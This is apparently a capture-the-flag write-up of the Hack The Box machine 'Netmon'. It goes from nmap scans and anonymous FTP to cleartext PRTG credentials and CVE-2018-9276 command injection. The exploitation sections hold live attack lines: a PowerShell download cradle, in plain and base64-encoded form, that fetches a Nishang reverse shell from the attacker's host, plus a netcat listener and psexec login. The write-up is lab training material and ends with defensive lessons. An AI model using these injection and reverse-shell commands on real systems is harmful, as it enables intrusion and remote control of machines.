# Netmon Writeup w/o Metasploit

![](https://miro.medium.com/max/588/1*XyHuUKMnpOtCPA1sKDqeGQ.png)

## Reconnaissance <a id="55bf"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.152 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.152Host is likely running Windows---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-28 01:37 EST
Nmap scan report for 10.10.10.152
Host is up (0.053s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
80/tcp  open  http
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-dsNmap done: 1 IP address (1 host up) scanned in 1.90 seconds---------------------Starting Nmap Basic Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-28 01:37 EST
Nmap scan report for 10.10.10.152
Host is up (0.035s latency).PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:
|_clock-skew: mean: 2m19s, deviation: 0s, median: 2m19s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-02-28T06:40:16
|_  start_date: 2020-02-28T06:37:07Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.57 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-28 01:38 EST
Warning: 10.10.10.152 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.152
Host is up (0.043s latency).
All 1000 scanned ports on 10.10.10.152 are open|filtered (871) or closed (129)Nmap done: 1 IP address (1 host up) scanned in 130.59 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-28 01:40 EST
Initiating Parallel DNS resolution of 1 host. at 01:40
Completed Parallel DNS resolution of 1 host. at 01:40, 0.02s elapsed
Initiating SYN Stealth Scan at 01:40
Scanning 10.10.10.152 [65535 ports]
...
Host is up (0.039s latency).
Not shown: 65443 closed ports, 79 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknownRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 132.61 seconds
           Raw packets sent: 66187 (2.912MB) | Rcvd: 65727 (2.629MB)Making a script scan on extra ports: 5985, 47001, 49664, 49665, 49666, 49667, 49668, 49669
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-28 01:42 EST
Nmap scan report for 10.10.10.152
Host is up (0.040s latency).PORT      STATE SERVICE VERSION
5985/tcp  open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc   Microsoft Windows RPC
49665/tcp open  msrpc   Microsoft Windows RPC
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC
49668/tcp open  msrpc   Microsoft Windows RPC
49669/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.27 seconds---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                                               
Running CVE scan on all ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-28 01:43 EST
Nmap scan report for 10.10.10.152
Host is up (0.045s latency).PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.97 secondsRunning Vuln scan on all ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-28 01:44 EST
Nmap scan report for 10.10.10.152
Host is up (0.041s latency).PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.152
....
|_http-passwd: ERROR: Script execution failed (use -d to debug)
|_http-server-header: PRTG/18.1.37.13946
...
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:
|_samba-vuln-cve-2012-1182: No accounts left to try
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: No accounts left to tryService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3549.49 seconds---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                                                                                                               
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.152:80 -o recon/gobuster_10.10.10.152_80.txt
nikto -host 10.10.10.152:80 | tee recon/nikto_10.10.10.152_80.txtgobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.152:5985 -o recon/gobuster_10.10.10.152_5985.txt
nikto -host 10.10.10.152:5985 | tee recon/nikto_10.10.10.152_5985.txtgobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.152:47001 -o recon/gobuster_10.10.10.152_47001.txt
nikto -host 10.10.10.152:47001 | tee recon/nikto_10.10.10.152_47001.txtSMB Recon:
                                                                                                                                                                               
smbmap -H 10.10.10.152 | tee recon/smbmap_10.10.10.152.txt
smbclient -L "//10.10.10.152/" -U "guest"% | tee recon/smbclient_10.10.10.152.txt
nmap -Pn -p445 --script vuln -oN recon/SMB_vulns_10.10.10.152.txt 10.10.10.152Which commands would you like to run?                                                                                                                                          
All (Default), gobuster, nikto, nmap, smbclient, smbmap, Skip <!>Running Default in (1) s: ---------------------Running Recon Commands----------------------....
                                                                                                                                                                               
=========================
                                                                                                                                                                               
Starting smbmap scan
                                                                                                                                                                               
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.152
[!] Authentication error on 10.10.10.152Finished smbmap scan
                                                                                                                                                                               
=========================
                                                                                                                                                                               
Starting smbclient scan
                                                                                                                                                                               
session setup failed: NT_STATUS_ACCOUNT_DISABLEDFinished smbclient scan
                                                                                                                                                                               
=========================                                                                                                                                            
```

**Note:** This scan generates a lot of results. I only show the results that contributed to rooting this machine.

We have thirteen ports open.

* **Port 21:** running Microsoft ftpd
* **Port 80:** running Indy httpd 18.1.37.13946 \(Paessler PRTG bandwidth monitor\)
* **Ports 139 & 445:** running SMB
* **Ports 135, 49664, 49665, 49666, 49667, 49668 & 49669:** running Microsoft Windows RPC
* **Ports 5985 & 47001:** running Microsoft HTTPAPI httpd 2.0 \(SSDP/UPnP\)

Before we move on to enumeration, let’s make some mental notes about the scan results.

* Anonymous FTP is enabled and it looks like it gives you access to the user’s operating system. Depending on the privilege we have, we might be able to view the _user.txt_ flag from there.
* Port 80 is running an off-the-shelf software. So the first thing I would do is test default credentials on the login page and the second thing I would do is run searchsploit on the software name and version to see if it is associated to any RCE vulnerabilities.

## Enumeration <a id="d3fb"></a>

I always start off with enumerating HTTP.

### **Port 80 HTTP** <a id="45c4"></a>

Visit the application in the browser.

![](https://miro.medium.com/max/1435/1*fHOoeRlh7NrViIGaK1Ky6A.png)

It’s running PRTG Network Monitor, which is a network monitoring software. The exact software version used is 18.1.37.13946. Since this is a network monitoring tool, chances are it is running with elevated privileges, so if the software contains an RCE, we’ll get a privileged shell.

Since this is an off-the-shelf software, let’s google for default credentials.

![](https://miro.medium.com/max/679/1*Yroey0Alv8aPDTKypScd8A.png)

I tried the _prtgadmin/prtgadmin_ credentials but that didn’t work. I don’t usually run a cracker on an off-the-shelf software \(b/c of lockout policies\), unless I’ve exhausted all other possibilities. So for now, let’s move on to enumerating FTP and get back to this later.

### Port 21 FTP <a id="65ba"></a>

Anonymous login is enabled for the FTP server.

```text
root@kali:~/Desktop/htb/netmon/ftp# ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
```

View the directories we have access to.

```text
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-02-19  11:18PM                 1024 .rnd
02-25-19  09:15PM       <DIR>          inetpub
07-16-16  08:18AM       <DIR>          PerfLogs
02-25-19  09:56PM       <DIR>          Program Files
02-02-19  11:28PM       <DIR>          Program Files (x86)
02-03-19  07:08AM       <DIR>          Users
02-25-19  10:49PM       <DIR>          Windows
226 Transfer complete.
```

Let’s download the _user.txt_ file to our attack machine.

```text
ftp> pwd
257 "/Users/Public" is current directory.ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
33 bytes received in 0.04 secs (0.8625 kB/s)
```

View the _user.txt_ file.

![](https://miro.medium.com/max/764/1*WPB6eH95pbTuJyTR23rLuA.png)

We don’t have access to the the Administrator’s directory.

```text
ftp> pwd
257 "/Users" is current directory.ftp> cd Administrator
550 Access is denied.
```

However, since we do have access to the operating system, maybe we can find cleartext/hashed/encrypted credentials that will allow us to log into PRTG. Again, because this is an off-the-shelf software, google should tell us where these credentials are stored.

The first entry we see on google is a [reddit post](https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/) discussing an email sent by PRTG to its users about exposed domain accounts and passwords in plain text.

The files that might contain cleartext credentials are listed below.

![](https://miro.medium.com/max/562/1*zK7ggJMXYLyRw9ASCOaEpQ.png)

Let’s see if we have access to any of these files on the FTP server.

```text
ftp> pwd
257 "/ProgramData/Paessler/PRTG Network Monitor" is current directory.ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-28-20  10:17PM       <DIR>          Configuration Auto-Backups
02-28-20  10:17PM       <DIR>          Log Database
02-02-19  11:18PM       <DIR>          Logs (Debug)
02-02-19  11:18PM       <DIR>          Logs (Sensors)
02-02-19  11:18PM       <DIR>          Logs (System)
02-28-20  10:17PM       <DIR>          Logs (Web Server)
02-28-20  10:17PM       <DIR>          Monitoring Database
02-25-19  09:54PM              1189697 PRTG Configuration.dat
02-25-19  09:54PM              1189697 PRTG Configuration.old
07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
02-28-20  10:18PM              1637528 PRTG Graph Data Cache.dat
02-25-19  10:00PM       <DIR>          Report PDFs
02-02-19  11:18PM       <DIR>          System Information Database
02-02-19  11:40PM       <DIR>          Ticket Database
02-02-19  11:18PM       <DIR>          ToDo Database
226 Transfer complete.
```

Let’s download everything in the directory to our attack machine.

```text
ftp> mget PRTG*
```

We don’t find any plaintext passwords in _PRTG Configuration.old_ and _PRTG Configuration.dat_. However, we do find credentials in the _PRTG Configuration.old.bak_ file.

```text
<dbpassword>
<!-- User: prtgadmin -->
PrTg@dmin2018
</dbpassword>
```

Let’s test them out on the login page. It doesn’t work. However, this is a backup file from the year 2018. According to the dates, the _PRTG Configuration.old_ file was last modified or created in 2019, so let’s try the following password.

```text
PrTg@dmin2019
```

We’re in!

![](https://miro.medium.com/max/1427/1*Us_7ZwQBlCdwe6O2-5rvkg.png)

Alright, run searchsploit on the software name to see if it is associated to any critical vulnerabilities.

![](https://miro.medium.com/max/1418/1*7g_nGwQYBCaVVpv_sT7cQA.png)

It’s vulnerable to an authenticated remote code execution \(RCE\) vulnerability.

For the exploitation phase, we’ll do this box in two ways. In the first way, we’ll use the script to exploit the box. In the second way, we’ll exploit the same vulnerability, except we’ll do it manually.

## Exploitation \#1: CVE 2018–9276 Exploit Script <a id="89ed"></a>

Copy the script to the current directory.

```text
searchsploit -m 46527
```

Run the script to see what parameters it requires to run.

![](https://miro.medium.com/max/1111/1*VOgnFp3R0u2oKRV0kARysw.png)

We need to first log in and grab our session cookies. We can do that by intercepting the request in Burp.

```text
_ga=GA1.4.2092334210.1582875922; _gid=GA1.4.597734317.1582875922; OCTOPUS1813713946=ezI0OTUwM0JELUYxMzYtNDE4RS05QTU5LUIyQUI2OUU0RjZDNn0%3D; _gat=1
```

Then run the script with the above cookies.

```text
bash 46527.sh -u http://10.10.10.152 -c "_ga=GA1.4.2092334210.1582875922; _gid=GA1.4.597734317.1582875922; OCTOPUS1813713946=ezI0OTUwM0JELUYxMzYtNDE4RS05QTU5LUIyQUI2OUU0RjZDNn0%3D; _gat=1"
```

We get syntax errors.

```text
46527.sh: line 16: $'\r': command not found
46527.sh: line 17: syntax error near unexpected token `$'\r''
'6527.sh: line 17: `usage()
```

The exploit seems to have not copied properly from searchsploit. So instead, manually copy the exploit rom [exploitdb](https://www.exploit-db.com/exploits/46527) and save it in a file _exploit.sh_. Then rerun the exploit.

```text
bash exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.2092334210.1582875922; _gid=GA1.4.597734317.1582875922; OCTOPUS1813713946=ezI0OTUwM0JELUYxMzYtNDE4RS05QTU5LUIyQUI2OUU0RjZDNn0%3D; _gat=1"
```

It runs successfully and creates the user ‘_pentest_’ with the password ‘_P3nT3st!_’ on the system.

![](https://miro.medium.com/max/1118/1*A-tfKJCzWay2lFvIl8b0tw.png)

Let’s use psexec to access that user’s account.

```text
root@kali:~/Desktop/htb/netmon# locate psexec.py
/root/Desktop/tools/impacket/examples/psexec.py
/usr/share/doc/python3-impacket/examples/psexec.py
/usr/share/set/src/fasttrack/psexec.py
```

Run the following command.

```text
python3 /usr/share/doc/python3-impacket/examples/psexec.py pentest:'P3nT3st!'@10.10.10.152
```

We’re in!

![](https://miro.medium.com/max/791/1*25aM214iN2FhjE_uLylRVQ.png)

Grab the _root.txt_ flag.

![](https://miro.medium.com/max/760/1*PZlB0_-fb5jqyAjSzxvorg.png)

## Exploitation \#2: Manual Command Injection <a id="e4fe"></a>

While running the exploit script and immediately getting a shell is easy, we don’t really learn much about how the exploit works. Since this is a relatively simple exploit, let’s try and do this manually.

This [blog](https://www.codewatch.org/blog/?p=453) explains in detail how the vulnerability was found. The issue seems to be with a test notification script that is included in the default installation of the application. The script does not validate user input and therefore is vulnerable to a command injection.

The notification system can be accessed through _Setup_ &gt; _Account Settings_ &gt; _Notifications_. Click on the _Add new notification_ icon. Add ‘_test_’ as the _Notification Name_. Then click on _execute Program_ and select the _Program File outfile.ps1_. In the _Parameter field_, let’s test out command injection by pinging our attack machine.

![](https://miro.medium.com/max/1238/1*VqzzBbaOo2UvYdazApqBWg.png)

Hit Save. On the attack machine run the following command to see if the program does ping us.

```text
tcpdump -i tun0 icmp
```

We get a hit back, so this is definitely vulnerable to a command injection.

![](https://miro.medium.com/max/1116/1*2Uc5wzm-RQV5fQ1IE438mQ.png)

Download the [Nishang](https://github.com/samratashok/nishang) repository and copy the _Invoke-PowerShellTcp.ps1_ script into your current directory.

```text
cp ../../tools/nishang/Shells/Invoke-PowerShellTcp.ps1 .
mv Invoke-PowerShellTcp.ps1 shell.ps1
```

Add the following line to the end of the script with the attack machine configuration settings.

```text
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 1234
```

When called, this sends a reverse shell back to our attack machine on port 1234.

Start up a python server in the directory that the shell script resides in.

```text
python -m SimpleHTTPServer 5555
```

Setup a listener to receive the reverse shell.

```text
nc -nlvp 1234
```

Then going back to the test notification job we created, change the _Parameter_ field to the following string.

```text
bla | iex(new-object net.webclient).downloadstring('http://10.10.14.7:5555/shell.ps1')
```

Click on the test object and send the test notification. We see that it downloaded the reverse shell, however, it didn’t give us a shell back. This could be because the application is not properly interpreting the characters in the command. So instead, let’s base64 encode it.

```text
echo "iex(new-object net.webclient).downloadstring('http://10.10.14.7:5555/shell.ps1')" | iconv -t UTF-16LE | base64 -w0
```

We get back the following base64 encoded command.

```text
aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcAOgA1ADUANQA1AC8AcwBoAGUAbABsAC4AcABzADEAJwApAAoA
```

Change the _Paramater_ field to the following string.

```text
bla | powershell -encodedCommand aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADcAOgA1ADUANQA1AC8AcwBoAGUAbABsAC4AcABzADEAJwApAAoA
```

We get a shell!

![](https://miro.medium.com/max/650/1*gb2UBw9zSrltQpbL9Hte5Q.png)

## Lessons Learned <a id="eada"></a>

To get SYSTEM on this box, we exploited three vulnerabilities.

* Insecure configuration of FTP server that allowed anonymous login. This allowed us to get access to the system and find cleartext credentials. The administrator should have disabled anonymous access to the FTP server.
* Cleartext credentials. A backup configuration file of the PRTG network monitoring tool contained cleartext credentials. As we saw in the reddit post, the company had sent its users an email warning them of exposed domain accounts and passwords. The administrator should have complied with the recommendation in the email and deleted the outlined files.
* Weak authentication credentials. Although we found old credentials that no longer were in use, we simply changed the year in the credentials and were able to access the admin account. The administrator should have used a complex password that would be difficult to crack and does not resemble previously used passwords on the application. Especially that those old passwords have been exposed to anyone that has had access to the system.
* Known command injection vulnerability. The PRTG network monitoring tool is not itself vulnerable, however, the default installation comes with a test script that is vulnerable to a command injection. This is a known vulnerability that the administrator should have addressed when it was made public. The quick fix would have been to simply remove the test script form the notifications section.

